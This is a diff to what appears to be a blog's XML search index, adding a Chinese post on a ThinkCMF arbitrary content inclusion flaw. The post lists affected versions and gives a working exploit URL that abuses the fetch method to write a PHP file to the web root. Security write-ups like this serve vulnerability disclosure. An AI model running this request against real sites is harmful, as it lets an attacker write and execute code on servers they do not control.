@@ -4,6 +4,19 @@
   
     
     <entry>
+      <title>ThinkCMF框架任意内容包含漏洞</title>
+      <link href="/2020/05/31/ThinkCMF%E6%A1%86%E6%9E%B6%E4%BB%BB%E6%84%8F%E5%86%85%E5%AE%B9%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"/>
+      <url>/2020/05/31/ThinkCMF%E6%A1%86%E6%9E%B6%E4%BB%BB%E6%84%8F%E5%86%85%E5%AE%B9%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
+      
+        <content type="html"><![CDATA[<p>ThinkCMF是一款基于PHP+MYSQL开发的中文内容管理框架，底层采用ThinkPHP3.2.3构建。</p><a id="more"></a><h2 id="0x01影响版本"><a href="#0x01影响版本" class="headerlink" title="0x01影响版本"></a>0x01影响版本</h2><p>ThinkCMF X1.6.0</p><p>ThinkCMF X2.1.0</p><p>ThinkCMF X2.2.0</p><p>ThinkCMF X2.2.1</p><p>ThinkCMF X2.2.2</p><p>ThinkCMF X2.2.3</p><h2 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h2><p>通过构造a参数的fetch方法，可以不需要知道文件路径就可以把php代码写入文件<br>exp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xxx.com&#x2F;?a&#x3D;fetch&amp;templateFile&#x3D;public&#x2F;index&amp;prefix&#x3D;&#39;&#39;&amp;content&#x3D;&lt;php&gt;file_put_contents(&#39;test.php&#39;,&#39;&lt;?php phpinfo();?&gt;&#39;)&lt;&#x2F;php&gt;</span><br></pre></td></tr></table></figure><p>最终会在目录下生成test.php的shell一句话。</p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>APP在线检测网站集合</title>
       <link href="/2020/05/31/APP%E5%9C%A8%E7%BA%BF%E6%A3%80%E6%B5%8B%E7%BD%91%E7%AB%99%E9%9B%86%E5%90%88/"/>
       <url>/2020/05/31/APP%E5%9C%A8%E7%BA%BF%E6%A3%80%E6%B5%8B%E7%BD%91%E7%AB%99%E9%9B%86%E5%90%88/</url>
